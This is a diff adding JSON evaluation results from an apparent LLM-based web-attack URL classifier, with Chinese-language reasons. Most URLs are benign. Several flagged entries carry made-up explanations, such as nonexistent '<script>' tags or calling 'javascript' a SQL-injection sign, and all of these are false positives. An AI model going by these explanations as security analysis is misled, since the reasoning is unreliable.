+    "url": "/ptopic17747/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ptopic17747 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.567,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ptopic17747 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/170026/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /170026 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.495,
+    "raw_response": "- 0 表示正常URL\n\nURL: /170026 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/main.php?logout=*|",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `logout`（路径遍历）",
+    "elapsed_time_sec": 1.114,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `logout`（路径遍历）",
+    "true_label": "0"
+  },
+  {
+    "url": "/index_j/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /index_j/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.562,
+    "raw_response": "- 0 表示正常URL\n\nURL: /index_j/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20050613-1/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20050613-1 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.662,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20050613-1 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/rugby_special/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.953,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1163871546374/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.919,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/monitory-lcd/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /monitory-lcd/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.726,
+    "raw_response": "- 0 表示正常URL\n\nURL: /monitory-lcd/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/126979/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /126979 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.562,
+    "raw_response": "- 0 表示正常URL\n\nURL: /126979 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/blade_4/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /blade_4/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.029,
+    "raw_response": "- 0 表示正常URL\n\nURL: /blade_4/ 是正常Web请求，符合标准的HTTP请求格式，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/20050207-4/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /20050207-4\n\n判断理由：该URL仅包含常规路径和静态资源访问，参数值为正常的业务数据，符合标准的HTTP请求格式。没有包含任何恶意攻击特征，因此判定为正常请求。",
+    "elapsed_time_sec": 1.849,
+    "raw_response": "- 0 表示正常URL\n\nURL: /20050207-4\n\n判断理由：该URL仅包含常规路径和静态资源访问，参数值为正常的业务数据，符合标准的HTTP请求格式。没有包含任何恶意攻击特征，因此判定为正常请求。",
+    "true_label": "0"
+  },
+  {
+    "url": "/2004 international religious freedom report/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.92,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/157207/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /157207 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.554,
+    "raw_response": "- 0 表示正常URL\n\nURL: /157207 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/policyb/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /policyb/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.012,
+    "raw_response": "- 0 表示正常URL\n\nURL: /policyb/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/top_fill/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /top_fill/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.663,
+    "raw_response": "- 0 表示正常URL\n\nURL: /top_fill/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/website",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.189,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/final_warning/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /final_warning/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.595,
+    "raw_response": "- 0 表示正常URL\n\nURL: /final_warning/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/resize.cs",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.179,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/msg.rtf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.191,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/cat.rb",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "elapsed_time_sec": 0.934,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）",
+    "true_label": "0"
+  },
+  {
+    "url": "/buy_phente/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.874,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "//yske4gpe.asp",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含SQL注入特征，具体为包含`'`、`--`、`#`、`union`、`select`等SQL语句。",
+    "elapsed_time_sec": 1.357,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含SQL注入特征，具体为包含`'`、`--`、`#`、`union`、`select`等SQL语句。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/menu.meta",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "elapsed_time_sec": 1.217,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`、`javascript:` 等 XSS 跨站脚本特征",
+    "true_label": "0"
+  },
+  {
+    "url": "/avalanche-research_0/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.886,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/privacy-gnw/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.951,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/176232/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /176232 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.517,
+    "raw_response": "- 0 表示正常URL\n\nURL: /176232 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/examples/jsp/checkbox/webc.cgi/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /examples/jsp/checkbox/webc.cgi 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.506,
+    "raw_response": "- 0 表示正常URL\n\nURL: /examples/jsp/checkbox/webc.cgi 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/cb_line/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /cb_line/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.409,
+    "raw_response": "- 0 表示正常URL\n\nURL: /cb_line/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bmw_3er/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.897,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/155362/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /155362 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.468,
+    "raw_response": "- 0 表示正常URL\n\nURL: /155362 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/shopping.nsf",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.266,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/1860720/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /1860720 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.572,
+    "raw_response": "- 0 表示正常URL\n\nURL: /1860720 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/spanbottombanner/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /spanbottombanner/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.636,
+    "raw_response": "- 0 表示正常URL\n\nURL: /spanbottombanner/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/tool.temp",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.184,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/061211beajava/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.916,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/blueberry/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /blueberry/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.989,
+    "raw_response": "- 0 表示正常URL\n\nURL: /blueberry/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/cards.tar.gz",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）",
+    "elapsed_time_sec": 1.689,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：命令执行  \n- 恶意特征：包含 `|`（命令注入）和 `javascript:`（XSS）",
+    "true_label": "0"
+  },
+  {
+    "url": "/000048129/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000048129 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.726,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000048129 是一个合法的Web请求，符合正常请求特征。该URL仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/page285/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /page285/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.818,
+    "raw_response": "- 0 表示正常URL\n\nURL: /page285/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/robotz_1287/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.911,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/headercurve/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /headercurve/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.717,
+    "raw_response": "- 0 表示正常URL\n\nURL: /headercurve/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/sex.err",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/sex.err`，其中`javascript`明显是SQL注入攻击的常见特征，且`sex.err`可能包含恶意代码。因此，该URL存在SQL注入攻击的特征。",
+    "elapsed_time_sec": 1.75,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`javascript/sex.err`，其中`javascript`明显是SQL注入攻击的常见特征，且`sex.err`可能包含恶意代码。因此，该URL存在SQL注入攻击的特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/seminari/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /seminari/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.804,
+    "raw_response": "- 0 表示正常URL\n\nURL: /seminari/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/337317/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /337317 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.609,
+    "raw_response": "- 0 表示正常URL\n\nURL: /337317 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ar2007010401345/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.989,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/hightech/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /hightech 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.017,
+    "raw_response": "- 0 表示正常URL\n\nURL: /hightech 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/partners.as",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "elapsed_time_sec": 1.256,
+    "raw_response": "- 1 表示异常URL  \n- 具体攻击类型：XSS  \n- 恶意特征：包含 `<script>`，属于XSS跨站脚本攻击的典型特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/industrevsamp/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /industrevsamp/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.119,
+    "raw_response": "- 0 表示正常URL\n\nURL: /industrevsamp/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/podat2/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.961,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/adv.pl",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/adv.pl`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS或命令执行。",
+    "elapsed_time_sec": 1.474,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含JavaScript代码，且包含`/javascript/adv.pl`路径，这属于典型的恶意攻击特征，例如SQL注入、XSS或命令执行。",
+    "true_label": "0"
+  },
+  {
+    "url": "/automotiveaccessories/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.959,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/ref010203/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /ref010203 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "elapsed_time_sec": 1.646,
+    "raw_response": "- 0 表示正常URL\n\nURL: /ref010203 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，且参数值为正常的业务数据，没有涉及任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/javascript/backups.meta",
+    "predicted": "1",
+    "reason": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/backups.meta`，其中`javascript`和`meta`是常见的恶意脚本特征，属于XSS攻击的典型表现。此外，该URL包含恶意脚本代码，可能用于执行远程命令或注入攻击。",
+    "elapsed_time_sec": 1.988,
+    "raw_response": "- 1 表示异常URL  \n- 判定理由：该URL包含`/javascript/backups.meta`，其中`javascript`和`meta`是常见的恶意脚本特征，属于XSS攻击的典型表现。此外，该URL包含恶意脚本代码，可能用于执行远程命令或注入攻击。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bot-jobs/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.956,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/intlitcp/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /intlitcp/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.813,
+    "raw_response": "- 0 表示正常URL\n\nURL: /intlitcp/ 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/homeownership/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /homeownership/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.999,
+    "raw_response": "- 0 表示正常URL\n\nURL: /homeownership/ 是一个合法的Web请求，符合正常请求特征，没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/closetorganizer/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /closetorganizer/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.173,
+    "raw_response": "- 0 表示正常URL\n\nURL: /closetorganizer/ 是一个合法的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/000110350/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /000110350 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "elapsed_time_sec": 1.732,
+    "raw_response": "- 0 表示正常URL\n\nURL: /000110350 是一个合法的Web请求，符合正常请求特征。它仅包含常规路径和静态资源访问，参数值为正常的业务数据，且未包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/bill hicks live/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.932,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/a15511-2005feb10/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.926,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/arch_bbedit714/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /arch_bbedit714/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "elapsed_time_sec": 1.98,
+    "raw_response": "- 0 表示正常URL\n\nURL: /arch_bbedit714/ 是一个合法的Web请求，符合正常请求特征。没有包含任何恶意攻击特征，例如SQL注入、XSS、命令执行、路径遍历等。该URL的结构和内容也符合标准的HTTP请求格式。",
+    "true_label": "0"
+  },
+  {
+    "url": "/news_html/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\nURL: /news_html/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "elapsed_time_sec": 1.739,
+    "raw_response": "- 0 表示正常URL\n\nURL: /news_html/ 是一个合法的Web请求，符合正常请求特征。它包含常规路径和静态资源访问，参数值为正常业务数据，且符合标准的HTTP请求格式。因此，判定为正常URL。",
+    "true_label": "0"
+  },
+  {
+    "url": "/trenner_inhalt-haupttext/",
+    "predicted": "0",
+    "reason": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "elapsed_time_sec": 0.928,
+    "raw_response": "- 0 表示正常URL\n\n该URL请求是正常的Web请求，符合标准的HTTP请求格式，且没有包含任何恶意攻击特征。",
+    "true_label": "0"
+  },
+  {
+    "url": "/abnehmen/",
+    "predicted": "0",
